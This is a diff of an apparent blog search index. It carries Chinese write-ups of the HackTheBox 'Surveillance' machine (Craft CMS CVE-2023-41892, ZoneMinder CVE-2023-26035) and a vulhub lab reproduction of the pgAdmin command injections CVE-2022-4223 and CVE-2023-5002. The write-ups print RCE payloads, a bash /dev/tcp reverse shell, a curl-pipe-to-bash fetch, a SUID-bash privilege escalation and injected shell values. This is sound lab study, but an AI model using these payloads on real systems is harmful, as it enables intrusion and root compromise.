-<p>扫出来两个端口，其中80端口有http服务并且重定向到surveillance.htb</p>
-<p>那么我们添加下域名然后访问80端口，发现是企业网站尝试扫描子域名和目录无果后，用Wappalyzer插件看看</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111184949465.png"></p>
-<p>得知是Craft CMS后，去网上搜一下发现存在远程代码执行漏洞(CVE-2023-41892) <a href="https://cloud.tencent.com/developer/article/2365764?areaId=106001">参考文章</a></p>
-<p>payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,    &quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>抓包修改为POST请求，添加payload成功RCE</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111185214507.png"></p>
-<p>仔细分析此payload的执行过程，原来是调用call_user_func函数只有一个参数，想反弹shell就卡住了</p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我在GitHub上找到写好的getshell脚本 <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">脚本链接</a></p>
-<p>成功反弹</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111194741978.png"></p>
-<p>由于不稳定，我们反弹到自己机子上</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.74/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Surveillance-HackTheBox/image-20240111195321224.png"></p>
-<p>我们注意到<code>/craft/storage/backups</code>目录下有zip文件</p>
-<p>先开启http服务，用wget下载下来查看</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111200833565.png"></p>
-<p>解压后打开看发现有信息泄露</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111201305915.png"></p>
-<p>直接拿join爆破一下，结果出现报错，提示使用其他哈希类型</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111203634494.png"></p>
-<p>最终在类型为Raw-SHA256爆破成功得到密码</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111203654261.png"></p>
-<p>知道密码后我们直接ssh连接（这里是用户matthew）</p>
-<p>得到user的flag</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111211630770.png"></p>
-<p>然后就没有收获了，于是我们决定进行更深层的探测潜在的特权提升路径和漏洞</p>
-<p>使用工具LinPEAS，我们现在本地开启http服务，然后使用curl命令去弹</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.74:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>
-
-<p>成功得到连接数据库的密码</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111214133572.png"></p>
-<p>当然也可以得到用户名</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111214620372.png"></p>
-<p>然后就进行mysql连接</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u craftuser -p -h localhost</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Surveillance-HackTheBox/image-20240111214901316.png"></p>
-<p>然后在craftdb中的users表找到admin的相关信息</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111215203687.png"></p>
-<p>使用john爆破失败</p>
-<p>回头继续分析，发现8080端口开放</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111215950995.png"></p>
-<p>那么我们使用ssh进行端口转发至本地的777端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 777:localhost:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
-
-<p>然后在浏览器访问本地777端口，发现是ZoneMinder</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111220606278.png"></p>
-<p>网上搜到ZoneMinder 代码执行漏洞(CVE-2023-26035)</p>
-<p>GitHub上有现成的poc <a href="https://github.com/rvizx/CVE-2023-26035">参考链接</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -t http://localhost:777/ -ip 10.10.14.74 -p</span><br></pre></td></tr></table></figure>
-
-<p>本地转发的777端口为target，然后1028为nc监听的端口</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连接到后<code>sudo -l</code>看看可执行的命令</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111223721833.png"></p>
-<p>下面这些二进制文件都可以执行，参考其他师傅wp可以知道在zmupdate.pl文件存在漏洞</p>
-<p>具体是指参数user的值可以为文件，那么我们可以上传shell脚本然后利用其user参数实现getshell</p>
-<p>过程如下，写入并赋予suid可执行权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash&#x27; &gt; /var/tmp/exploit.sh</span><br><span class="line">chmod +x /var/tmp/exploit.sh</span><br></pre></td></tr></table></figure>
-
-<p>然后再执行刚刚说的利用参数user</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version=1.36.32 --user=&#x27;$(/var/tmp/exploit.sh)&#x27; --pass=ZoneMinderPassword2023</span><br></pre></td></tr></table></figure>
-
-<p>执行完后我们再<code>/var/tmp/bash -p</code>得到完整的root权限</p>
-<p>得到flag</p>
-<p><img src="/article/Surveillance-HackTheBox/image-20240111224745965.png"></p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-        <tag>CMS</tag>
+        <tag>Windows</tag>
       </tags>
   </entry>
   <entry>
@@ -2160,6 +2193,95 @@
       <tags>
         <tag>HackTheBox</tag>
         <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Surveillance-HackTheBox</title>
+    <url>/article/Surveillance-HackTheBox.html</url>
+    <content><![CDATA[<p>CVE-2023-41892、CVE-2023-26035</p>
+<span id="more"></span>
+
+<h1 id="Surveillance-HackTheBox"><a href="#Surveillance-HackTheBox" class="headerlink" title="Surveillance-HackTheBox"></a>Surveillance-HackTheBox</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>nmap扫描端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v -p- --min-rate 1000 10.10.11.245</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Surveillance-HackTheBox/image-20240111180818681.png"></p>
+<p>扫出来两个端口，其中80端口有http服务并且重定向到surveillance.htb</p>
+<p>那么我们添加下域名然后访问80端口，发现是企业网站尝试扫描子域名和目录无果后，用Wappalyzer插件看看</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111184949465.png"></p>
+<p>得知是Craft CMS后，去网上搜一下发现存在远程代码执行漏洞(CVE-2023-41892) <a href="https://cloud.tencent.com/developer/article/2365764?areaId=106001">参考文章</a></p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,    &quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>抓包修改为POST请求，添加payload成功RCE</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111185214507.png"></p>
+<p>仔细分析此payload的执行过程，原来是调用call_user_func函数只有一个参数，想反弹shell就卡住了</p>
+<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>我在GitHub上找到写好的getshell脚本 <a href="https://github.com/Faelian/CraftCMS_CVE-2023-41892">脚本链接</a></p>
+<p>成功反弹</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111194741978.png"></p>
+<p>由于不稳定，我们反弹到自己机子上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.74/1028 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Surveillance-HackTheBox/image-20240111195321224.png"></p>
+<p>我们注意到<code>/craft/storage/backups</code>目录下有zip文件</p>
+<p>先开启http服务，用wget下载下来查看</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111200833565.png"></p>
+<p>解压后打开看发现有信息泄露</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111201305915.png"></p>
+<p>直接拿join爆破一下，结果出现报错，提示使用其他哈希类型</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111203634494.png"></p>
+<p>最终在类型为Raw-SHA256爆破成功得到密码</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111203654261.png"></p>
+<p>知道密码后我们直接ssh连接（这里是用户matthew）</p>
+<p>得到user的flag</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111211630770.png"></p>
+<p>然后就没有收获了，于是我们决定进行更深层的探测潜在的特权提升路径和漏洞</p>
+<p>使用工具LinPEAS，我们现在本地开启http服务，然后使用curl命令去弹</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl http://10.10.14.74:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>
+
+<p>成功得到连接数据库的密码</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111214133572.png"></p>
+<p>当然也可以得到用户名</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111214620372.png"></p>
+<p>然后就进行mysql连接</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -u craftuser -p -h localhost</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Surveillance-HackTheBox/image-20240111214901316.png"></p>
+<p>然后在craftdb中的users表找到admin的相关信息</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111215203687.png"></p>
+<p>使用john爆破失败</p>
+<p>回头继续分析，发现8080端口开放</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111215950995.png"></p>
+<p>那么我们使用ssh进行端口转发至本地的777端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -L 777:localhost:8080 matthew@10.10.11.245</span><br></pre></td></tr></table></figure>
+
+<p>然后在浏览器访问本地777端口，发现是ZoneMinder</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111220606278.png"></p>
+<p>网上搜到ZoneMinder 代码执行漏洞(CVE-2023-26035)</p>
+<p>GitHub上有现成的poc <a href="https://github.com/rvizx/CVE-2023-26035">参考链接</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 exploit.py -t http://localhost:777/ -ip 10.10.14.74 -p</span><br></pre></td></tr></table></figure>
+
+<p>本地转发的777端口为target，然后1028为nc监听的端口</p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连接到后<code>sudo -l</code>看看可执行的命令</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111223721833.png"></p>
+<p>下面这些二进制文件都可以执行，参考其他师傅wp可以知道在zmupdate.pl文件存在漏洞</p>
+<p>具体是指参数user的值可以为文件，那么我们可以上传shell脚本然后利用其user参数实现getshell</p>
+<p>过程如下，写入并赋予suid可执行权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &#x27;cp /bin/bash /var/tmp/bash;chmod 4755 /var/tmp/bash&#x27; &gt; /var/tmp/exploit.sh</span><br><span class="line">chmod +x /var/tmp/exploit.sh</span><br></pre></td></tr></table></figure>
+
+<p>然后再执行刚刚说的利用参数user</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/bin/zmupdate.pl --version=1.36.32 --user=&#x27;$(/var/tmp/exploit.sh)&#x27; --pass=ZoneMinderPassword2023</span><br></pre></td></tr></table></figure>
+
+<p>执行完后我们再<code>/var/tmp/bash -p</code>得到完整的root权限</p>
+<p>得到flag</p>
+<p><img src="/article/Surveillance-HackTheBox/image-20240111224745965.png"></p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+        <tag>CMS</tag>
       </tags>
   </entry>
   <entry>
@@ -2556,63 +2678,6 @@
       </tags>
   </entry>
   <entry>
-    <title>pgAdmin命令执行漏洞</title>
-    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
-    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
-<span id="more"></span>
-
-<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
-<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
-<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
-</blockquote>
-<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
-<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
-<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
-<p>在本地搭建环境，访问5050端口是登录界面</p>
-<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
-<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
-
-<p>成功命令执行，返回包如下</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
-<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
-<ul>
-<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
-<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
-</ul>
-<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
-<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
-<ul>
-<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
-<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
-</ul>
-<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
-<p>Windows下返回结果为True</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
-<p>而Linux下返回结果为False</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
-<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
-<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
-<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
-<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
-<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130919337.png"></p>
-<p>成功命令执行</p>
-<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410131015271.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞分析</category>
-      </categories>
-  </entry>
-  <entry>
     <title>fastjson入门学习</title>
     <url>/article/fastjson%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0.html</url>
     <content><![CDATA[<p>记录对java安全的初次探索</p>
@@ -2868,83 +2933,61 @@
       </tags>
   </entry>
   <entry>
-    <title>区块链 fabric搭建</title>
-    <url>/article/%E5%8C%BA%E5%9D%97%E9%93%BE-fabric%E6%90%AD%E5%BB%BA.html</url>
-    <content><![CDATA[<p>记录Ubuntu22.04下搭建fabric平台</p>
+    <title>pgAdmin命令执行漏洞</title>
+    <url>/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html</url>
+    <content><![CDATA[<p>注意到p神在paper发的一篇跟pgAdmin命令执行漏洞有关的文章，所以利用vulhub靶场环境复现一下</p>
 <span id="more"></span>
 
+<h1 id="pgAdmin命令执行漏洞"><a href="#pgAdmin命令执行漏洞" class="headerlink" title="pgAdmin命令执行漏洞"></a>pgAdmin命令执行漏洞</h1><p><a href="https://paper.seebug.org/3144/#2-cve-2023-5002pgadmin-76">参考文章</a></p>
+<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><blockquote>
+<p>pgAdmin是一种开源的数据库管理工具，它用于管理和操作PostgreSQL数据库。PostgreSQL是一种功能强大的关系型数据库系统，而pgAdmin则是一个用于管理和维护这个数据库系统的图形用户界面（GUI）工具。</p>
+</blockquote>
+<p>本文复现关于pgAdmin的两个命令执行漏洞，结合源码进行分析 <a href="https://pgadmin-archive.postgresql.org/pgadmin4/index.html">源码链接</a></p>
+<h2 id="pgAdmin"><a href="#pgAdmin" class="headerlink" title="pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）"></a>pgAdmin &lt;&#x3D; 6.16 未授权命令执行漏洞（CVE-2022-4223）</h2><p>pgAdmin支持在后台设置psql、pg_dump、pg_restore等PostgreSQL数据库工具所在的基础路径，在保存设置前，用户可以执行<code>validate_binary_path</code>这个API来检查路径是否合法。</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409223437075.png"></p>
+<p>这里用户传入的<code>utility_path</code>拼接上可执行文件名后，直接拼接进<code>subprocess.getoutput()</code>方法执行。这是一个非常简单的命令注入漏洞。而且这个API没有增加<code>@login_required</code>修饰器，任意用户均可调用这个函数，导致了在<code>/misc/validate_binary_path</code>路由下的未授权命令执行漏洞。</p>
+<p>在本地搭建环境，访问5050端口是登录界面</p>
+<p>然后我们抓包在accept头添加<code>application/json</code>，成功获取token值</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409224520953.png"></p>
+<p>将获取到的<code>session id</code>和<code>csrf token</code>填写进去发包，并添加上执行命令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /misc/validate_binary_path HTTP/1.1</span><br><span class="line">Host: 192.168.132.1:5050</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">X-pgA-CSRFToken: IjMyODM1ZTI2OGEzNjM3NmRiYzIyNDQ0YTFkNjQ3YzI4NWZmNDMwZmQi.ZhVW6g.9aUPlOreLBBdKoERuk8XTHn2bvE</span><br><span class="line">Accept: application/json,text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Cookie: pga4_session=698f6cec-3920-409a-8a39-cee41d7b7815!5R1QUKdHv1IxxFVR1iKc3HwVy0gN3hizTfVj3xTSjhI=</span><br><span class="line">Content-Length: 27</span><br><span class="line"></span><br><span class="line">&#123;&quot;utility_path&quot;:&quot;a\&quot;;id;#&quot;&#125;</span><br></pre></td></tr></table></figure>
 
+<p>payload将前面的双引号闭合后，用<code>#</code>将后面代码注释掉</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">subprocess.getoutput(&#x27;&quot;a\&quot;;id;#&quot; --version&#x27;.format(full_path))</span><br></pre></td></tr></table></figure>
 
-<h2 id="前置环境"><a href="#前置环境" class="headerlink" title="前置环境"></a>前置环境</h2><h3 id="安装docker及docker-compose"><a href="#安装docker及docker-compose" class="headerlink" title="安装docker及docker-compose"></a>安装docker及docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 安装Docker</span><br><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install docker.io</span><br><span class="line"></span><br><span class="line"># 安装Docker Compose</span><br><span class="line">sudo apt-get install docker-compose</span><br></pre></td></tr></table></figure>
+<p>成功命令执行，返回包如下</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409231120579.png"></p>
+<h2 id="pgAdmin-1"><a href="#pgAdmin-1" class="headerlink" title="pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）"></a>pgAdmin &lt;&#x3D; 7.6 后台命令执行漏洞（CVE-2023-5002）</h2><p>官方对于CVE-2022-4223漏洞，做了如下两个处理：</p>
+<ul>
+<li>给<code>validate_binary_path</code>函数增加<code>@login_required</code>装饰器，限制未授权的用户访问相关接口  </li>
+<li>使用<code>os.path.exists()</code>检查用户传入的路径是否有效</li>
+</ul>
+<p><code>@login_required</code>装饰器是由Flask-Login这个第三方库提供的能力，并不存在绕过的问题，所以这个API后续就没法再无授权的情况下利用了。</p>
+<p>对于使用<code>os.path.exists()</code>检查用户传入的路径是否存在，我们可以有两个绕过方法：</p>
+<ul>
+<li>使用<code>../</code>跳转到一个存在的目录，如：<code>/path/to/exist/folder/a&quot;;id;/../</code></li>
+<li>通过文件上传等功能创建一个文件名中包含Payload的文件</li>
+</ul>
+<p>对于第一个方法来说（注意php和python环境都行）判断文件存在时，Windows会将路径normalize后再判断，Linux会逐级判断文件夹是否存在，因此具体执行结果也会不同</p>
+<p>Windows下返回结果为True</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409232705036.png"></p>
+<p>而Linux下返回结果为False</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240409234553656.png"></p>
+<p>所以在Windows环境下我们可以直接绕过<code>os.path.exists()</code>继续注入命令，但Linux下则无法实现命令执行</p>
+<p>搭建环境，使用帐号<code>vulhub@example.com</code>和密码<code>vulhub</code>登录pgAdmin</p>
+<p>然后访问<code>工具 =&gt; 存储管理器</code>，创建目录<code>&quot;;id;#</code></p>
+<p>这样在与<code>/var/lib/pgadmin/storage/vulhub_example.com/</code>拼接后的绝对路径，用于漏洞利用</p>
+<p><img src="/article/pgAdmin%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/image-20240410130307002.png"></p>
+<p>访问<code>设置 =&gt; 配置 =&gt;路径</code>界面，然后添加上刚刚拼接的绝对路径，点击验证</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/lib/pgadmin/storage/vulhub_example.com/&quot;;id;#</span><br></pre></td></tr></table></figure>
 
-<p>查看version检查是否安装成功</p>
-<img src="/article/区块链-fabric搭建/image-20240527220801577.png" style="zoom:150%;">
-
-<p>然后将用户添加到docker的用户组</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo usermod -a -G docker rev1ve</span><br></pre></td></tr></table></figure>
-
-<p>由于docker拉取镜像较慢，使用阿里云的加速器 <a href="https://cr.console.aliyun.com/cn-hangzhou/instances/mirrors">官网链接</a></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo vim /etc/docker/daemon.json</span><br></pre></td></tr></table></figure>
-
-<p>添加下面内容</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;registry-mirrors&quot;: [&quot;https://nxmpk3z3.mirror.aliyuncs.com&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>重启服务即可</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl daemon-reload</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="安装Go语言"><a href="#安装Go语言" class="headerlink" title="安装Go语言"></a>安装Go语言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install golang-go</span><br></pre></td></tr></table></figure>
-
-<p>查看version检查是否安装成功</p>
-<h3 id="安装Node-js和npm"><a href="#安装Node-js和npm" class="headerlink" title="安装Node.js和npm"></a>安装Node.js和npm</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install nodejs</span><br><span class="line">sudo apt-get install npm</span><br></pre></td></tr></table></figure>
-
-<h3 id="安装git"><a href="#安装git" class="headerlink" title="安装git"></a>安装git</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure>
-
